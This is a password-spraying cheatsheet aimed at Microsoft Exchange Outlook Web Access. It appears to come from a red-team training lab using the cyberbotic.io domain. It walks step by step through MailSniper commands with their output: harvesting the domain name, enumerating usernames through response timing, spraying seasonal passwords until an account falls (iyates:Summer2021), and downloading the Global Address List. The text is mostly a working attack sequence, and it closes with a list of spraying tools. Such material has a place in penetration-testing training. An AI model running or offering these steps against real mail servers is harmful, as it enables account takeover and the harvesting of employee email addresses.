# Password Spraying

### Common pattern:

* MonthYear (September2021)
* SeasonYear (Spring2021)
* DayDate (Wednesday1)

### Cheatsheet

Using `ipmo` to import the .ps1 script

```
PS C:\> ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Enumerate the NetBIOS name with `Invoke-DomainHarvestOWA`

```
PS C:\> Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
[*] Harvesting domain name from the server at 10.10.15.100
The domain appears to be: CYBER or cyberbotic.io
```

Generate potential usernames using [namemash.py](https://gist.github.com/superkojiman/11076951)

```
root@kali:~# /opt/namemash.py names.txt >> possible-usernames.txt
root@kali:~# head -n 5 possible-usernames.txt
bobfarmer
farmerbob
bob.farmer
farmer.bob
farmerb
```

Enumerating usernames using `Invoke-UsernameHarvestOWA`

```
PS C:\> Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt
[*] Now spraying the OWA portal at https://10.10.15.100/owa/
Determining baseline response time...
Response Time (MS)       Domain\Username
770                      CYBER\nigojk
766                      CYBER\hnIYRl
763                      CYBER\DlQFbq
767                      CYBER\ghyWXj
771                      CYBER\uQbXAI

         Baseline Response: 767.4

Threshold: 460.44
Response Time (MS)       Domain\Username
764                      CYBER\THdtMw
776                      CYBER\rVNvmq
854                      CYBER\AvaPOc
767                      CYBER\ZQpHFz
764                      CYBER\WYTZHK
77                       CYBER\iyates
[*] Potentially Valid! User:CYBER\iyatesgs
[*] A total of 1 potentially valid usernames found.
Results have been written to valid.txt.

```

Password spraying using `Invoke-PasswordSprayOWA`

```
PS C:\> Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021
[*] Now spraying the OWA portal at https://10.10.15.100/owa/
[*] SUCCESS! User:CYBER\iyates Password:Summer2021
[*] A total of 1 credentials were obtained.
```

Retrieving the Global Address List (GAL) using `Get-GlobalAddressList`

```
PS C:\> Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\iyates -Password Summer2021 -OutFile gal.txt
[*] First trying to log directly into OWA to enumerate the Global Address List using FindPeople...
[*] This method requires PowerShell Version 3.0
[*] Using https://10.10.15.100/owa/auth.owa
[*] Logging into OWA...
[*] OWA Login appears to be successful.
[*] Retrieving OWA Canary...
[*] Successfully retrieved the X-OWA-CANARY cookie: ahhlRb0kZUKEg8YEo5ZZtQDYwqU8EdkIl7OJ7_ugwGfk56YCYe0ilgE2GKVxCNJTMpqknR3QJ_M.
[*] Retrieving AddressListId from GetPeopleFilters URL.
[*] Global Address List Id of b4477ba8-52b0-48bf-915e-d179db98788b was found.
[*] Now utilizing FindPeople to retrieve Global Address List
[*] Now cleaning up the list...
bfarmer@cyberbotic.io
iyates@cyberbotic.io
jadams@cyberbotic.io
jking@cyberbotic.io
nglover@cyberbotic.io
[*] A total of 5 email addresses were retrieved
[*] Email addresses have been written to gal.txt
```

### Tools

* [MailSniper](https://github.com/dafthack/MailSniper) - Searching email in Microsoft Exchange, enumerating users and domains, gathering Global Address List (GAL) from OWA and EWS...
* [namemash.py](https://gist.github.com/superkojiman/11076951) - Creating a user name list for brute force attacks.
* [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) - Password spraying attacks against Lync/S4B, OWA & O365

